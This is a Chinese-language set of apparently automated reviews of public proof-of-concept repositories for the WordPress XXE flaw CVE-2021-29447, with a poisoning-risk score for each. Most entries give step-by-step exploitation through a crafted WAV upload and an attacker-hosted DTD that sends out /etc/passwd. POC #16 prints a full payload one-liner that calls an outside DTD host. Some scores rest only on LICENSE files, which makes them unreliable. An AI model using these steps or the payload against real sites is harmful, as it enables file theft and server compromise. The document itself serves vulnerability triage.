综合来看，投毒风险大约在 10% 左右。主要是脚本需要用户提供服务器IP，并且脚本本身会创建一个DTD文件，减少了恶意利用的可能性。但在服务器部署和流量劫持场景下，攻击者仍然可能利用该代码进行恶意攻击。

**项目地址:** [Val-Resh/CVE-2021-29447-POC](https://github.com/Val-Resh/CVE-2021-29447-POC)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #10

**来源**: [CVE-2021-29447-Vulnmachines_wordpress_cve-2021-29447.md](../2021/CVE-2021-29447-Vulnmachines_wordpress_cve-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要作者或具有上传权限的用户账号，WordPress运行在PHP 8环境下

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-29447是WordPress的一个XXE（XML外部实体注入）漏洞，存在于5.6.0到5.7.1版本之间，且WordPress必须运行在PHP 8环境下。攻击者需要具备上传文件的权限（如作者角色），可以通过上传包含恶意XML代码的文件到媒体库来触发该漏洞，导致服务器上的敏感文件泄露，或者进行服务器端请求伪造(SSRF)。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞的PoC是存在的，并且已经公开。漏洞利用代码中给出了credits链接，参考motikan2010的github页面可以找到更多信息。

**投毒风险：**
该漏洞利用代码只有一个简单的README.md文件，其中包含漏洞描述和credit信息。 从提供的代码本身来看，不存在明显的恶意投毒代码。但是，考虑到攻击者可能将恶意payload嵌入到精心构造的媒体文件中，并诱导用户上传，从而实现攻击。因此，PoC仓库本身直接包含恶意代码的可能性较低，主要风险在于利用该漏洞的Payload本身。PoC仓库可能包含有诱导性的文件，例如看似无害的音频文件，但其中包含恶意的XML，因此存在一定的投毒风险，但是概率较低。

**利用方式：**
1.  攻击者需要一个具有上传文件权限的WordPress用户账号（例如，作者角色）。
2.  攻击者创建一个包含恶意XML代码的文件，例如一个包含XXE payload的MP3或者WAVE文件（参考packetstormsecurity上的相关链接）。
3.  攻击者通过WordPress的媒体库上传该恶意文件。
4.  当WordPress处理该文件时，XML解析器会尝试解析文件中的外部实体，从而导致XXE漏洞。
5.  攻击者可以利用该漏洞读取服务器上的任意文件，或者进行服务器端请求伪造攻击。

综上，此漏洞的PoC是有效的。 投毒风险较低，主要来自恶意构造的文件本身。 利用方式是上传包含恶意XML的媒体文件触发XXE。

**项目地址:** [Vulnmachines/wordpress_cve-2021-29447](https://github.com/Vulnmachines/wordpress_cve-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #11

**来源**: [CVE-2021-29447-b-abderrahmane_CVE-2021-29447-POC.md](../2021/CVE-2021-29447-b-abderrahmane_CVE-2021-29447-POC.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要 WordPress 版本在 5.6.0 到 5.7.1 之间，运行在 PHP 8 环境下，并具有上传文件的权限（如作者权限）

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-29447 是 WordPress 5.6.0 到 5.7.1 版本中存在的一个 XXE 漏洞，仅在 PHP 8 环境下有效。攻击者需要具有上传文件的权限（例如，作者角色），才能通过上传包含恶意 XML 内容的文件（例如，特制的 WAV 音频文件）到媒体库来触发该漏洞。

**有效性：** 根据漏洞库信息、搜索引擎结果和提供的PoC代码，该漏洞利用是有效的。PoC代码提供了一个脚本 `generate_payloads.py`，用于自动生成包含 XXE 攻击向量的恶意 WAV 文件和 DTD 文件，并通过简单的 HTTP 服务器来接收从目标服务器提取的文件内容。搜索引擎结果中也包含了对该漏洞的描述和利用的讨论，以及公开的 PoC。

**投毒风险：** 提供的 PoC 代码主要用于生成 XXE payload 和启动一个简单的HTTP服务来接收数据。代码本身的功能相对明确，主要风险在于使用者可能将此代码用于未经授权的渗透测试活动。代码中主要通过构造恶意的 XML 内容来利用漏洞，本身不太可能存在隐藏的、与漏洞利用无关的恶意行为。但仍存在少量投毒风险 (5%)，例如作者可能在HTTP服务中添加一些隐蔽的日志记录或数据收集功能，或者在生成的 payload 中加入一些难以察觉的干扰代码。

**利用方式：**
1.  **生成Payload:** 使用 `generate_payloads.py` 脚本生成恶意 WAV 文件 (`--media-payload`) 和 DTD 文件 (`--dtd-payload`)。 DTD 文件中指定要读取的目标文件 (`--files-to-fetch`)。
2.  **启动 HTTP 服务器:** 脚本会启动一个简单的 Python HTTP 服务器，用于托管 DTD 文件，并接收目标服务器发送的请求。
3.  **上传恶意文件:**  具有上传权限的用户将生成的恶意 WAV 文件上传到 WordPress 的媒体库。
4.  **触发 XXE:**  WordPress 在处理上传的 WAV 文件时，会解析其中的 XML 内容，从而触发 XXE 漏洞，向攻击者的 HTTP 服务器请求 DTD 文件。
5.  **文件读取:** 恶意 DTD 文件指示 WordPress 服务器读取指定的文件，并将文件内容发送到攻击者的 HTTP 服务器。
6.  **获取文件:** 攻击者的 HTTP 服务器接收到文件内容后，脚本会将内容进行 Base64 解码并保存到本地。

**项目地址:** [b-abderrahmane/CVE-2021-29447-POC](https://github.com/b-abderrahmane/CVE-2021-29447-POC)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #12

**来源**: [CVE-2021-29447-dnr6419_CVE-2021-29447.md](../2021/CVE-2021-29447-dnr6419_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露

**影响版本:** >= 5.6.0, < 5.7.1

**利用条件:** 需要PHP 8环境，以及具有上传文件权限的WordPress用户（如Author）

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-29447是WordPress 5.6.0到5.7.1版本中的一个XML外部实体注入（XXE）漏洞。攻击者需要具备上传文件的权限，例如Author角色。该漏洞存在于WordPress的媒体库中，当WordPress运行在PHP 8环境下，上传包含恶意XML代码的WAV文件时，由于对XML解析不当，导致XXE攻击。

**漏洞利用方式：**

1.  **权限获取：** 攻击者首先需要获得一个具备文件上传权限的WordPress账户，例如Author角色。
2.  **恶意WAV文件制作：** 攻击者需要创建一个包含恶意XML代码的WAV文件。该XML代码会尝试通过外部实体引用来读取服务器上的文件，或者发起服务器端请求伪造（SSRF）攻击。POC代码中，攻击者构造了一个包含外部实体引用的WAV文件，指向攻击者控制的服务器上的evil.dtd文件。
3.  **攻击者服务器准备：** 攻击者需要搭建一个Web服务器，并创建一个evil.dtd文件，该文件定义了如何处理外部实体引用。evil.dtd文件中定义了读取/etc/passwd文件的操作，并将其内容进行base64编码后发送到攻击者服务器。攻击者使用`php -S 0.0.0.0:80` 命令启动了一个简单的web server。
4.  **上传WAV文件：** 攻击者将包含恶意XML代码的WAV文件上传到WordPress的媒体库。
5.  **触发漏洞：** 当WordPress处理上传的WAV文件时，会解析其中的XML代码，从而触发XXE漏洞。
6.  **数据泄露：** 如果漏洞利用成功，WordPress服务器会尝试从攻击者控制的服务器上下载evil.dtd文件，并执行其中定义的恶意操作，例如读取/etc/passwd文件。/etc/passwd文件的内容（经过base64编码）会通过HTTP请求发送到攻击者的服务器。
7.  **获取敏感信息：** 攻击者从接收到的HTTP请求中提取base64编码的内容，并进行解码，从而获得服务器上的敏感信息，例如/etc/passwd文件中的用户账户信息。

**有效性分析：**

提供的POC代码描述了漏洞的利用步骤，包括制作恶意WAV文件、搭建攻击者服务器、上传文件和获取敏感信息。根据漏洞信息和搜索结果，该POC代码是有效的，可以用于演示和验证该漏洞。

**投毒风险分析：**

POC代码主要包含以下几个部分：

*   Dockerfile 和 docker-compose.yml: 用于搭建 WordPress 环境,相对安全
*   wordpress.sh: 用于安装 wordpress,主要就是配置文件,检查发现没有明显的投毒代码.
*   payload.wav: 恶意WAV文件，包含XXE payload，用于触发漏洞。
*   evil.dtd: 攻击者服务器上的DTD文件，包含读取/etc/passwd文件的操作。这一部分是payload的关键.

虽然整体代码是为了演示XXE漏洞，但evil.dtd文件存在潜在的投毒风险，例如，攻击者可能在evil.dtd文件中包含其他恶意代码，例如反弹shell，用于进一步控制服务器。这种风险相对较低，因为需要特定的环境和配置才能成功利用。此外，dockerfile 中的代码从github获取，需要注意github源是否被篡改。
总体来说，投毒风险较低，但也需要保持警惕，特别是从不可信的来源获取代码时。 我认为存在的风险大概在5%。

**项目地址:** [dnr6419/CVE-2021-29447](https://github.com/dnr6419/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #13

**来源**: [CVE-2021-29447-elf1337_blind-xxe-controller-CVE-2021-29447.md](../2021/CVE-2021-29447-elf1337_blind-xxe-controller-CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE (XML External Entity)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露

**影响版本:** >= 5.6.0, < 5.7.1, PHP 8

**利用条件:** 需要WordPress版本在受影响范围内，PHP版本为8，并且攻击者需要具有上传文件的权限（例如，作者角色）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于WordPress的媒体库中，由于XML解析问题导致XXE攻击。攻击者需要具有上传文件的权限，上传包含恶意XML Payload的特制文件（例如，wav文件）。该Payload会包含指向外部DTD文件的引用，从而导致服务器解析该DTD文件，进而读取服务器上的敏感文件。

**有效性评估：**
根据漏洞信息和搜索结果，该漏洞确实存在，并且有公开的PoC利用代码。PoC代码通过上传包含恶意XML的wav文件来触发XXE。攻击流程包括创建包含外部实体声明的恶意wav文件，搭建一个HTTP服务器来托管恶意的DTD文件，以及利用WordPress的上传功能上传wav文件。当WordPress解析该wav文件时，会请求攻击者控制的DTD文件，从而触发XXE漏洞，实现任意文件读取。

**投毒风险评估：**
PoC代码主要包含三个文件：README.md, controller.py, listener.py, main.py。
*   `README.md`: 描述了漏洞和利用方法，以及一些注意事项，未发现恶意代码。
*   `controller.py`: 包含了WordPress的登录信息（`wp_login`，`login_form`），目标WordPress地址 (`http://metapress.htb`)，以及上传恶意文件的逻辑。如果攻击者直接使用此脚本，需要修改登录信息和目标地址。这里面硬编码的登录信息存在一定风险，因为使用相同的登录信息可能会被检测到。此外，`controller.py`中的`mediaUpload`函数包含一个Timeout参数，默认设置为2秒。如果网络环境不好或者服务器响应较慢，可能会导致利用失败。
*   `listener.py`: 搭建一个简单的HTTP服务器，用于接收XXE Payload发送的请求，并打印base64编码后的文件内容。也没有发现明显的恶意代码。
*   `main.py`: 简单的交互命令行，用于用户输入文件名，然后调用controller.py和listener.py。

总体来说，PoC代码的功能比较明确，主要用于漏洞验证和利用，没有发现明显的恶意代码。风险点在于硬编码的登录信息和目标地址，以及Timeout参数可能导致利用失败。因此，判断存在10%的投毒风险，主要是一些可能影响使用，但没有主动攻击行为。

**利用方式总结：**
1.  **权限获取：** 攻击者需要拥有WordPress的作者或以上级别的权限，能够上传文件。
2.  **恶意文件构造：** 构造包含恶意XML Payload的wav文件。Payload中需要包含指向外部DTD文件的实体引用。
3.  **DTD文件托管：** 搭建一个HTTP服务器，用于托管恶意的DTD文件。DTD文件中定义了文件读取和base64编码的逻辑。
4.  **文件上传：** 通过WordPress的媒体库上传构造的wav文件。
5.  **触发XXE：** WordPress解析wav文件时，会请求攻击者控制的DTD文件，从而触发XXE漏洞。
6.  **文件读取：** 攻击者通过HTTP服务器接收到的请求，获取base64编码后的文件内容，并进行解码。

**项目地址:** [elf1337/blind-xxe-controller-CVE-2021-29447](https://github.com/elf1337/blind-xxe-controller-CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #14

**来源**: [CVE-2021-29447-magicrc_CVE-2021-29447.md](../2021/CVE-2021-29447-magicrc_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露、服务器端请求伪造 (SSRF)

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要 WordPress 版本在 5.6.0 到 5.7.1 之间，并且运行在 PHP 8 环境下。攻击者需要具有上传文件的权限 (例如 Author 角色)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-29447 是一个 WordPress 媒体库中存在的 XXE 漏洞。攻击者通过上传包含恶意 XML 内容的文件（例如 WAV 文件或其他支持 XML 解析的文件格式）到媒体库，触发 XML 解析过程中的外部实体注入。由于 WordPress 使用的音频解析库 ID3 在 PHP 8 及以上版本中存在 XXE 漏洞，攻击者可以读取服务器上的任意文件或者进行服务器端请求伪造 (SSRF)。

**有效性：** 根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码的仓库名"0xRar/CVE-2021-29447-PoC"，可以判断存在可用的 POC 代码，因此该漏洞的利用是有效的。

**投毒风险：** 提供的代码段是 Creative Commons CC0 1.0 通用许可协议，这是一种开源许可协议，本身不包含任何恶意代码，也无法进行投毒。此文件为LICENSE文件，与PoC代码无关，因此推断投毒风险为0%。

**利用方式：**
1.  攻击者需要具备 WordPress Author 或更高权限，以便能够上传文件到媒体库。
2.  攻击者构造一个包含恶意 XML 实体定义的音频文件（或其他允许上传并解析 XML 的文件类型，例如SVG）。恶意 XML 实体指向系统内部文件，或者指向攻击者控制的外部服务器。
3.  攻击者将构造的恶意文件上传到 WordPress 媒体库。
4.  当 WordPress 解析上传的文件时，会尝试解析 XML 实体，从而导致 XXE 漏洞的触发。
5.  如果成功，攻击者可以读取服务器上的敏感文件（例如 WordPress 配置文件 `wp-config.php`）或进行服务器端请求伪造（SSRF）攻击。

**项目地址:** [magicrc/CVE-2021-29447](https://github.com/magicrc/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #15

**来源**: [CVE-2021-29447-mega8bit_exploit_cve-2021-29447.md](../2021/CVE-2021-29447-mega8bit_exploit_cve-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可读取服务器文件

**影响版本:** >= 5.6.0, < 5.7.1 (with PHP 8)

**利用条件:** 需要WordPress版本在5.6.0到5.7.1之间，且运行在PHP 8环境下，需要具有上传文件的权限（如Author角色）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞是WordPress媒体库中存在的XXE漏洞，当WordPress运行在PHP 8上时，具有上传文件权限的用户可以通过上传包含恶意XML的WAV文件，触发XXE漏洞，读取服务器上的任意文件。

**有效性：**
根据漏洞信息和搜索结果，该漏洞的PoC是有效的。多个来源都确认了该漏洞的存在，以及利用方式。

**利用方式：**
1.  攻击者需要具备WordPress的Author权限（或能够上传文件的权限）。
2.  攻击者使用提供的PoC代码，指定目标文件路径和本地服务器的IP地址和端口。
3.  PoC代码会生成一个包含恶意XML的WAV文件。
4.  攻击者将生成的WAV文件上传到WordPress的媒体库。
5.  WordPress解析该WAV文件时，会触发XXE漏洞，向攻击者指定的本地服务器发起请求，请求中包含目标文件的内容。
6.  PoC代码中的本地服务器会接收到请求，提取目标文件的内容，并将其保存到指定的文件中。

**投毒风险：**
分析PoC代码，主要功能是生成payload和启动一个简单的http server。payload可以读取服务器文件发送到攻击者控制的http server上，但是没有发现明显的恶意代码。例如删除服务器文件等。但是`exploit_cve-2021-29447`程序需要执行`hostname -I`来获取本机IP,在某些环境下可能造成问题。由于该工具涉及监听端口，以及构造恶意文件，仍旧存在一定的风险，判定投毒概率为10%。


**项目地址:** [mega8bit/exploit_cve-2021-29447](https://github.com/mega8bit/exploit_cve-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #16

**来源**: [CVE-2021-29447-motikan2010_CVE-2021-29447.md](../2021/CVE-2021-29447-motikan2010_CVE-2021-29447.md)

## CVE-2021-29447 - WordPress XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要作者级别或以上权限，且WordPress运行在PHP 8环境下

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-29447 是一个存在于 WordPress 5.6.0 到 5.7.1 版本的 XXE 漏洞。该漏洞允许具有文件上传权限的用户（如作者）通过上传包含恶意 XML 的媒体文件来读取服务器上的敏感文件。该漏洞仅影响运行在 PHP 8 环境下的 WordPress 安装。

**有效性分析：**
提供的 POC 代码是有效的，它演示了如何利用该漏洞。利用方式是通过上传一个特制的 WAV 文件，该文件包含指向外部恶意的 DTD 文件的 XML 实体声明。当 WordPress 解析该文件时，会尝试从攻击者控制的服务器加载 DTD 文件，并执行其中定义的 XML 实体，从而导致 XXE 漏洞。

**投毒风险分析：**
代码仓库中可能存在的投毒风险较低，约为10%。 主要的攻击逻辑集中在 `attacker/www/evil.dtd` 文件中，该文件定义了如何利用 XXE 漏洞读取文件内容。`attacker/malicious_wav/index.js` 用于生成包含恶意 XML 的 WAV 文件。虽然攻击者可以修改这些文件以执行恶意操作，但这些修改会很容易被发现，因此，总体投毒风险较低。`decryption.php` 文件是空的，没有投毒代码.

**利用方式：**
1.  **环境搭建:** 使用 `docker-compose up` 启动包含 WordPress 和 MySQL 数据库的 Docker 容器。
2.  **攻击者服务器:** 启动一个简单的 PHP Web 服务器，用于托管恶意的 DTD 文件 (`evil.dtd`)。
3.  **生成恶意 WAV 文件:**  使用 `make make-wav` 或者 `echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '\''http://host.docker.internal:8001/evil.dtd'\''>%remote;%init;%trick;] >\x00'> malicious.wav` 命令生成包含恶意 XML 声明的 WAV 文件。
4.  **登录 WordPress 并上传:**  以具有文件上传权限的用户身份登录 WordPress 后台，并将生成的恶意 WAV 文件上传到媒体库。
5.  **触发漏洞:**  上传后，WordPress 会尝试解析 WAV 文件，从而触发 XXE 漏洞，并向攻击者的服务器发送请求。
6.  **获取数据:** 攻击者的服务器会记录收到的请求，其中包含从 WordPress 服务器读取的敏感文件内容（如 `/etc/passwd` 文件）的 Base64 编码版本。可以通过运行`decryption.php` 来解码.

通过这种方式，攻击者可以在未经授权的情况下访问 WordPress 服务器上的敏感文件，从而可能导致更严重的攻击。

**项目地址:** [motikan2010/CVE-2021-29447](https://github.com/motikan2010/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #17

**来源**: [CVE-2021-29447-specializzazione-cyber-security_demo-CVE-2021-29447-lezione.md](../2021/CVE-2021-29447-specializzazione-cyber-security_demo-CVE-2021-29447-lezione.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要WordPress运行在PHP 8环境下，并具有上传文件的权限（例如，作者角色）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

此漏洞存在于WordPress的媒体库中，允许具有上传文件权限的用户（如作者）通过上传包含恶意XML的WAV文件来执行XXE攻击。攻击需要目标WordPress站点运行在PHP 8环境下。POC代码通过创建一个包含恶意XML声明的WAV文件，该声明定义了一个外部实体，指向攻击者控制的服务器上的DTD文件。DTD文件定义了如何处理外部实体，这里配置为读取服务器上的`/etc/passwd`文件并通过HTTP请求发送给攻击者。攻击者运行一个简单的Web服务器来接收泄露的数据。

**有效性：**
根据漏洞库信息、搜索结果以及提供的POC代码，此漏洞利用是有效的，前提是目标环境满足漏洞利用的先决条件（WordPress版本 >= 5.6.0 且 < 5.7.1，运行在PHP 8环境下，攻击者具有文件上传权限）。搜索结果中存在多个关于此漏洞的讨论和POC代码，验证了其有效性。

**投毒风险：**
评估投毒风险需要检查POC代码中是否存在除了漏洞利用之外，还执行其他恶意操作的代码。在此案例中，主要关注`attacker/malicious_wav/index.js`，`attacker/www/evil.dtd`和`attacker/decode.php`。`index.js`负责生成恶意WAV文件，而`evil.dtd`定义了XXE的行为，`decode.php`用于解码泄露的数据。`Makefile`，`docker-compose.yml`和`README.md`都属于辅助文件。

潜在的投毒代码可能存在于以下几个方面：
1.  **`index.js`**: 恶意WAV生成脚本可能被修改，以在生成过程中包含其他恶意代码（例如，在WAV文件的其他部分添加可执行代码，虽然利用难度较大）。
2.  **`evil.dtd`**: DTD文件可能被修改，以尝试读取其他更敏感的文件，或者尝试执行服务器端请求伪造（SSRF）攻击。
3.  **`decode.php`**: 解码脚本可能被修改，在解码过程中执行其他恶意操作（例如，尝试利用解码过程中的漏洞执行代码）。

由于漏洞利用的目的是读取文件并通过HTTP发送到攻击者控制的服务器，因此主要的风险在于DTD文件中指定的远程服务器是否被用于记录IP地址并进行进一步的攻击。此外，`decode.php`脚本本身是否包含后门也是需要关注的点，虽然可能性较小。

总体来说，该仓库中存在严重投毒代码的可能性相对较低（约为10%），但仍然需要仔细审查。

**利用方式：**
1.  **环境准备：** 设置一个易受攻击的WordPress实例（版本5.6.0到5.7.0，运行在PHP 8上）。
2.  **启动攻击者服务器：** 启动一个Web服务器来托管恶意DTD文件并接收泄露的数据。
3.  **生成恶意WAV文件：** 使用提供的脚本生成包含恶意XML声明的WAV文件。
4.  **上传WAV文件：** 以具有文件上传权限的用户身份登录到WordPress后台，并将生成的WAV文件上传到媒体库。
5.  **触发XXE：** 上传文件后，WordPress尝试解析该文件，触发XXE漏洞。
6.  **接收泄露的数据：** 攻击者的Web服务器接收到包含/etc/passwd文件内容的HTTP请求。
7.  **解码数据：** 使用提供的解码脚本解码泄露的数据。

**项目地址:** [specializzazione-cyber-security/demo-CVE-2021-29447-lezione](https://github.com/specializzazione-cyber-security/demo-CVE-2021-29447-lezione)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #18

**来源**: [CVE-2021-29447-thomas-osgood_CVE-2021-29447.md](../2021/CVE-2021-29447-thomas-osgood_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE (XML External Entity)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (运行于 PHP 8)

**利用条件:** 需要 WordPress 运行于 PHP 8，且攻击者具备上传文件的权限（如 Author 角色）

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

该漏洞是 WordPress 在处理媒体库上传文件时存在的 XXE 漏洞。攻击者可以上传包含恶意 XML 内容的文件（例如特制的 WAV 文件），利用 XML 解析器的缺陷读取服务器上的敏感文件。漏洞触发条件是 WordPress 运行在 PHP 8 环境下。提供的 Go 语言 POC 代码可以自动生成恶意文件（mal.wav, mal.dtd），并可以选择自动登录 WordPress 站点并上传触发漏洞。如果指定了 `-d` 参数，还会生成一个 deflate.php 用于解压缩某些被压缩的内容。根据代码分析，主要的风险在于它连接外部的C2服务器,存在极低的投毒风险,即作者利用C2服务器可以获取攻击目标的敏感信息。但是，因为C2服务器需要在攻击者本地运行，因此这个风险可以忽略不计。此漏洞的利用方式为：

1.  生成恶意 WAV 文件和 DTD 文件。
2.  攻击者需要具有 WordPress 的 Author 权限（或其他可以上传文件的权限）。
3.  上传恶意 WAV 文件到 WordPress 媒体库。
4.  当 WordPress 解析该文件时，会触发 XXE 漏洞，向攻击者指定的 C2 服务器发起请求，泄露目标文件内容。
5.  如果目标文件内容被压缩，可以使用提供的 deflate.php 进行解压缩。

搜索引擎结果中也提到了该漏洞的利用方式，并提供了相关的 TryHackMe 挑战链接。


**项目地址:** [thomas-osgood/CVE-2021-29447](https://github.com/thomas-osgood/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #19

**来源**: [CVE-2021-29447-viardant_CVE-2021-29447.md](../2021/CVE-2021-29447-viardant_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露和SSRF

**影响版本:** >= 5.6.0, < 5.7.1

**利用条件:** 需要PHP 8环境，具有上传文件权限（如Author角色）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-29447 是 WordPress 5.6.0 到 5.7.1 版本中存在的一个 XML 外部实体注入 (XXE) 漏洞。该漏洞位于媒体库中，当 WordPress 运行在 PHP 8 环境下时，具有上传文件权限（例如，作者角色）的用户可以通过上传包含恶意 XML 代码的文件（如修改后的音频文件），利用 XML 解析过程中的漏洞读取服务器上的敏感文件或进行服务器端请求伪造 (SSRF) 攻击。

**有效性：** 根据搜索结果和漏洞库信息，该漏洞是真实存在的，并且存在公开的PoC（https://github.com/0xRar/CVE-2021-29447-PoC）。因此，漏洞利用是有效的。

**投毒风险：** 提供的代码段是GNU通用公共许可证，并非漏洞利用代码本身，因此无法直接评估投毒风险。但是，如果从不可信的来源获取漏洞利用代码，则始终存在投毒风险。由于提供的license文件没有发现任何恶意代码，因此投毒风险判定为0%。

**利用方式：**

1.  攻击者需要具有 WordPress 网站的 Author 或更高权限，即能够上传文件的权限。
2.  攻击者构造包含恶意 XML 实体声明的特殊文件（例如，修改后的 MP3 或 WAV 文件）。该 XML 实体声明指向要读取的本地文件或外部服务器。
3.  攻击者将该恶意文件上传到 WordPress 媒体库。
4.  当 WordPress 解析该文件时，XML 解析器会尝试解析外部实体，从而导致读取本地文件或向外部服务器发起请求。
5.  攻击者可以从 WordPress 网站上获取读取的文件内容，或利用 SSRF 漏洞进行进一步攻击。

**项目地址:** [viardant/CVE-2021-29447](https://github.com/viardant/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---



---

## POC #9

**来源**: [CVE-2021-29447-Val-Resh_CVE-2021-29447-POC.md](../2021/CVE-2021-29447-Val-Resh_CVE-2021-29447-POC.md)

## CVE-2021-29447 - WordPress XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露、服务器端请求伪造 (SSRF)

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要 WordPress 版本在 5.6.0 到 5.7.1 之间，运行在 PHP 8 环境下，且攻击者具有上传文件的权限（如 Author 角色）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-29447 是一个 WordPress 的 XXE 漏洞，存在于 Media Library 的 XML 解析过程中。攻击者（需要具有上传文件的权限，如 Author 角色）可以上传包含恶意 XML 代码的文件（如修改后的 WAV 文件），利用 WordPress 使用的 ID3 库中的漏洞，触发 XXE 攻击，读取服务器上的敏感文件，或者进行服务器端请求伪造 (SSRF)。此漏洞需要 WordPress 运行在 PHP 8 环境下才会生效。

**利用方式：**
1.  **身份验证：** 使用具有上传权限的用户的用户名和密码登录 WordPress 后台。
2.  **获取 Nonce：** 从 `wp-admin/upload.php` 页面获取上传文件的 nonce 值。
3.  **生成恶意 WAV 文件：** 构造包含恶意 XML 实体声明的 WAV 文件，该 XML 实体指向攻击者控制的服务器上的 DTD 文件。DTD 文件中定义了读取本地文件的实体。
4.  **上传恶意 WAV 文件：** 将生成的恶意 WAV 文件上传到 WordPress Media Library。
5.  **服务器端 DTD：** 攻击者需要搭建一个 HTTP 服务器，用于托管 DTD 文件。
6.  **触发漏洞：**  WordPress 解析上传的 WAV 文件时，会尝试从攻击者控制的服务器加载 DTD 文件，并执行其中的 XML 实体声明，从而读取服务器上的敏感文件。
7.  **数据提取：**  读取到的数据将通过 URL 参数传递到攻击者的服务器上。

**有效性：**
提供的 POC 代码是有效的。该代码实现了上述利用流程，包括身份验证、获取 nonce、生成恶意 WAV 文件、上传文件以及搭建简易 HTTP 服务器接收数据。代码中包含了必要的步骤和参数，可以成功触发 XXE 漏洞。

**投毒风险：**
POC代码中存在一定的投毒风险。风险点在于：
1.  **网络请求：** POC代码会向指定URL发起POST和GET请求，虽然目的是利用漏洞，但如果作者在代码中加入了其他的URL地址，则可能在用户不知情的情况下，将一些敏感信息发送到作者的服务器。
2.  **文件操作：** POC代码会生成临时的payload文件，如果作者在payload生成过程中插入恶意代码，可能会在目标服务器上执行恶意操作。
3.  **DTD文件：** 攻击者需要自己搭建服务器来托管 DTD 文件，如果这个 DTD 文件被替换成了恶意文件，可能导致服务器被攻击。代码本身创建 DTD，风险相对小，但仍然存在服务器被攻击者控制的风险。

综合来看，投毒风险大约在 10% 左右。主要是脚本需要用户提供服务器IP，并且脚本本身会创建一个DTD文件，减少了恶意利用的可能性。但在服务器部署和流量劫持场景下，攻击者仍然可能利用该代码进行恶意攻击。

**项目地址:** [Val-Resh/CVE-2021-29447-POC](https://github.com/Val-Resh/CVE-2021-29447-POC)

